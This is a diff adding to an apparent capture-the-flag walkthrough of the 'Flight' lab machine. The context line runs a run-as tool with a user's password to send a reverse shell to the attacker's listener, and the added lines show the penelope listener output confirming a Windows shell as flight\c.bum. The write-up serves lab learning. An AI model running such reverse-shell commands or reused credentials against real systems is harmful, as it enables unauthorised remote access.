@@ -628,5 +628,19 @@ SHELL> ./rac.exe c.bum 'Tikkycoll_431012284' -r 10.10.14.90:1338 cmd
 This sent the connection
 
 ```python
+penelope -p 1338          
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.1.150 • 172.18.0.1 • 172.17.0.1 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] • G0 10.129.228.120 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 flight\c.bum • Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/G0~10.129.228.120-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_03_31-18_41_04-982.log
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows\system32>whoami
+whoami
+flight\c.bum
 
+C:\Windows\system32>
 ```
+Now i have a shell as `c.bum`
+
